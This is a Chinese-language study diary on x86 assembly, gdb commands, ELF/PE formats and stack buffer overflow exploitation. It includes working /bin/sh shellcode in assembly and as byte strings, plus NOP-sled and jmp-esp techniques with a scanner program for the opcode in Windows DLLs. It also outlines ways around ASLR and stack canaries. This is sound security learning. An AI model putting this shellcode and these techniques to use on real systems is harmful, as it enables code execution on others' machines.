```
学习日记1
```

### 汇编基础（x86）

- 内存

- 寄存器： 

- 1. 普通: EAX, EBX, ECX, EDX
                 ESI, EDI, EBP, ESP
  2. 段寄存器:      CS, DS, ES, FS, GS, SS
  3. 特殊寄存器:      EIP, EFLAGS

- 指令: 

- 1. push,pop
  2. add/sub/mul/div,      xor, or
  3. mov,      lea,
  4. test,      cmp, jmp, call, ret

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625155650349.png" style="zoom:25%;" />

### 栈上的数据

EIP存储的是下一条要执行的指令的地址，所以若EIP的值被修改为我们期望的地址，函数运行到ret时，程序将会跳到修改后的地址运行指令。根据上面来看，在进入函数时，通常栈上的数据是这样的。可以看出，ESP永远指向栈顶的位置，而EBP则永远指向当前函数空间的栈底。

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625155751637.png" style="zoom:40%;" />

**IA32寄存器**

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625155828057.png" style="zoom:25%;" />

**x86-64寄存器**

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625155850731.png" style="zoom:25%;" />

**关键寄存器**

- EIP： 

- - 指向下一条要被执行的指令，cpu将从eip指向的地址获取指令
  - 不能被直接覆写

- ESP： 

- - 指向栈顶
  - PUSH/POP操作都基于操作ESP

**基本指令**

- 操作栈 

- - push
  - pop

- 运算操作 

- - add/sub/mul/div
  - xor/or

- 内存/寄存器操作 

- - mov/lea

- 条件执行 

- - test，cmp，jmp
  - jz，jnz，jg，ja

- 子程序调用 

- - call，ret

**重要指令**

- call     <function>:执行目标函数

- - 把下一条指令（返回地址）压栈
  - 跳转到目标函数
  - 应该在函数调用完之后执行下一条指令

- ret：返回调用

- - 弹出（pop）栈顶，得到返回地址
  - 跳转到跳转到返回地址（通过改变EIP）
  - 应该跳转到调用方的下一条指令

**函数调用时发生了什么**(x86)

1. 传递参数
2. call     函数地址（push eip，jmp 被调函数地址）
3. ebp入栈，当前esp复制到ebp，esp减去一个数值，形成该函数的栈空间
4. 初始化局部变量（自动变量）
5. 运行函数指令
6. 返回值传递
7. pop ebp
8. ret（pop     eip）

这里没有提到平衡栈帧的操作，实际上根据调用约定的不同，这个操作会在调用者或被调用者两个地方进行。

**Intel 和 AT&T语法**

| **Intel Syntax** | **AT&T Syntax**   |
| ---------------- | ----------------- |
| mov  eax,1       | movl $1,  %eax    |
| mov ebx,  0ffh   | movl  $0xff, %ebx |
| int 80h          | int  $0x80        |

```assembly
sum: 
    push ebp
    mov ebp, esp
    mov eax, [ebp+12]
    add eax, [ebp+8]
    pop ebp
    retn
sum:
    pushl %ebp
    movl %esp,%ebp
    movl 12(%ebp),%eax
    addl 8(%ebp),%eax
    popl %ebp
    ret
```

| **Intel Syntax**                                     | **AT&T Syntax**                                              |
| ---------------------------------------------------- | ------------------------------------------------------------ |
| AT&T 语法先写源操作数，再写目标操作数                | Intel  语法先写目标操作数，再写源操作数：                    |
| AT&T 语法将操作数的大小表示在指令的后缀中（b、w、l） | Intel  语法将操作数的大小表示在操作数的前缀中（BYTE PTR、WORD PTR、DWORD PTR） |
| AT&T 语法总体上是offset(base, index, width)的格式    | Intel  语法总体上是[INDEX * WIDTH + BASE + OFFSET]的格式     |
| AT&T 语法用前缀表示数制（0x、0、0b）                 | Intel  语法用后缀表示数制（h、o、b）                         |
| AT&T 语法要在常数前加 $、在寄存器名前加 % 符号       | Intel  语法没有相应的东西要加                                |

**gdb**

**gdb指令（短/长）**

- r/run, c/continue
- s/step, n/next
- si, ni
- b/break
- bt/backtrace
- x, print, display,     info
- ...

- Breakpoints: stops     when executed 

- - break function
  - break *addr
  - info break
  - clear function
  - delete/enable/disable      [n]

- Watchpoints: stops     when values changed 

- - watch expr
  - info watch

- continue
- step：     向前移动一步（语句），在调用函数时进入被调用者
- stepi：    向前移动一步（指令），在调用函数时进入被调用者
- next：     向前移动一步（语句），在调用函数时跳过被调用者
- nexti：    向前移动一步（指令），在调用函数时跳过被调用者

- print [/f] expr

- 1. x      十六进制
  2. d      有符号十进制
  3. u      无符号十进制
  4. o      八进制
  5. t       二进制
  6. a      地址
  7. c      character
  8. f       浮点数

- info reg [rn]

- Display 

- - x [/Nuf] expr 

  - - N count of units       to display

    - u unit size 

    - - b 字节
      - h 双字
      - w 四字
      - g 八字节

    - f printing format       

    - - s 空字符结束的字符串
      - i 汇编指令

  - disassem [addr]

**链接过程**

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625161620552.png" alt="image-20210625161620552" style="zoom:20%;" />

**文件格式**

- 文件类型识别 

- - file命令
  - 文件magic
  - binwalk项目，参考ReFirmLabs/binwalk

- 文件检查 

- - md5sum，校验文件md5值
  - virustotal,识别恶意代码
  - fuzzy hashing: ssdeep fuzzywuzzy
  - diff/patch

- ELF/PE/Mach-O 

- - readelf命令
  - peview/loard-pe/等

**ELF文件格式**

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625161817046.png" alt="image-20210625161817046" style="zoom: 33%;" />

**PE文件格式**

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625161921562.png" alt="image-20210625161921562" style="zoom:33%;" />

**如何利用缓冲区溢出**

- 覆盖局部变量 

- - 尤其是函数指针

- 覆盖错误句柄

- 覆盖存储在栈帧上的指针

- 覆盖返回地址 

- - 当函数返回时改变EIP

**shellcode开发**

```c
void main(){
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0],name,NULL);
}
```

**如何利用缓冲区溢出**

把指令和数据改为字符串形式

"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x46
 \x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\
 xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\x
 ff\xff\xff/bin/sh"

**shellcode开发**

编写汇编程序

```assembly
section .text
global _start
_start:
xor eax,eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push eax
push ebx
mov ecx,esp
xor edx,edx
mov al,0xb
int 0x80
```

编译并获取机器码

char shellcode[]="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";

- 不是所有的字符都能作为shellcode     

- - gets():遇到换行符就停止
  - strcpy():遇到NULL就停止
  - ...

- shellcode需要做相应的调整 

- - 删除 \x00,空格，换行符...
  - 删除不能被打印的字符

**基础栈溢出**

- 覆盖返回地址，shellcode位与栈上     

- - 问题：攻击者如何精确定位shellcode的地址
  - 解决：NOP slide

- 猜测大概的栈地址

- 在shellcode前面填充大量NOPs

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625164034717.png" alt="image-20210625164034717" style="zoom:35%;" />

- 覆盖返回地址，shellcode位与栈上     

- - 问题：如果buffer长度小于shellcode长度
  - 解决：RNS模式

- 把shellcode放在内存的高位上（调用者的栈帧）

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625164102489.png" alt="image-20210625164102489" style="zoom:33%;" />

**关于字符串的危险库函数**

- strcpy (char *dest,     const char *src)
- strcat (char *dest,     const char *src)
- gets (char *s)
- scanf ( const char     *format, ... )
- ...

**基础栈溢出的问题**

- 依赖缓冲区/栈的地址，栈的地址会根据平台和每次运行而改变。
- 如何构造一个适用于大多数平台的攻击？

**jmp esp**

- 寻找指令"jmp     esp"的地址
- 不需要知道shellcode的地址

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625164339018.png" alt="image-20210625164339018" style="zoom:33%;" />

**到哪里寻找 "jmp esp"**

```c
#include <windows.h>
#include <stdio.h>
int main(int,char**,char**)
{
	BYTE* pbyte;
	int nPos=0,nAddr=0;
	HINSTANCE hHinst=NULL;
	bool bTips=true;
	hHinst=LoadLibrary("user32.dll");
	if(!hHinst) return 0;
	pbyte=(BYTE*)hHinst;
	while(bTips)
	{
		if(pbyte[nPos]==0xff && pbyte[nPos+1]==0xe4)
		{
			nAddr=(int)pbyte+nPos;
			printf("address is 0x%x\n",nAddr);
			bTips=false;
         }
         else
           nPos++;
     }
     if(hHinst!=NULL) FreeLibrary(hHinst);
     return 1;
}
```

```c++
#include<windows.h>
#include<iostream.h>
#include<tchar.h>
int main()
{
int nRetCode=0;
bool we_load_it=false;
HINSTANCE h;
TCHAR dllname[]=_T("ntdll");       
h=GetModuleHandle(dllname);
if(h==NULL)
  {h=LoadLibrary(dllname);
if(h==NULL)
 {cout<<"ERROR LOADING DLL:"<<dllname<<endl;
return 1;
}
we_load_it=true;
}
BYTE* ptr=(BYTE*)h;
bool done=false;
for(int y=0;!done;y++)
{try
{
if(ptr[y]==0xFF&&ptr[y+1]==0xE4)
{int pos=(int)ptr+y;
cout<<"OPCODE found at 0x"<<hex<<pos<<endl;}}
catch(...)
{
cout<<"END OF"<<dllname<<"MEMORY REACHED"<<endl;
done=true;
}
}
if(we_load_it)
FreeLibrary(h);
return nRetCode;

}
```

```c++
#include<windows.h>
#include<iostream.h>

#include<tchar.h>
int main()
{
int nRetCode=0;
bool we_load_it=false;
HINSTANCE h;
TCHAR dllname[]=_T("ntdll");       
h=GetModuleHandle(dllname);
if(h==NULL)
  {h=LoadLibrary(dllname);
if(h==NULL)
 {cout<<"ERROR LOADING DLL:"<<dllname<<endl;
return 1;
}
we_load_it=true;
}
BYTE* ptr=(BYTE*)h;
bool done=false;
for(int y=0;!done;y++)
{try
{
if(ptr[y]==0xFF&&ptr[y+1]==0xE4)
{int pos=(int)ptr+y;
cout<<"OPCODE found at 0x"<<hex<<pos<<endl;}}
catch(...)
{
cout<<"END OF"<<dllname<<"MEMORY REACHED"<<endl;
done=true;
}
}
if(we_load_it)
FreeLibrary(h);
return nRetCode;
}
```

不知道哪个能用>(●'◡'●)<

**ASLR和PIE**

地址址空间配置随机化（英语：Address space layout randomization，缩写ASLR，又称位址空间配置随机化、位址空间布局随机化）它是一种防范内存损坏漏洞被利用的计算机安全技术。位址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。

- 程序每次执行的地址和libc的地址都会随机变化
- 使用固定地址的"jmp esp== '\xff\xe4' "攻击失效

**应对手段**

**泄漏libc基地址**

即使开启地址随机化，也不是全随机的。对于linux来说，开启ASLR，libc的基地址在每一次启动时都会变化，但是libc本身是整块存入内存的。即libc中指令相对于其基地址的偏移是不会变化的。而libc本身的指令是足够getshell的，所以要对抗ASLR，可以从泄露libc基地址下手。

**stack cookies**

Canary

在缓冲区和返回地址之间插入一个cookie，函数返回时会检查其是否被修改，如果与插入时的值不一致，则认为发生了缓冲区溢出。

<img src="C:\Users\86153\AppData\Roaming\Typora\typora-user-images\image-20210625170722345.png" alt="image-20210625170722345" style="zoom:33%;" />

- 绕过手段 

- - 通过信息泄漏漏洞获取cookie
  - 使用不会覆盖cookie的漏洞
  - 覆盖其他敏感数据而不是返回地址

**影子栈-StackShield**

- 把正确的返回地址保存在一个攻击者难以接触的地方
- 函数返回时把当前返回地址和保存的返回地址比较

在函数开始是保存RET，在函数返回时比较。

- 优势 

- - 返回地址难以覆盖

- 劣势 

- - 高性能开销
  - 保存的返回地址需要被保护
  - 兼容性问题

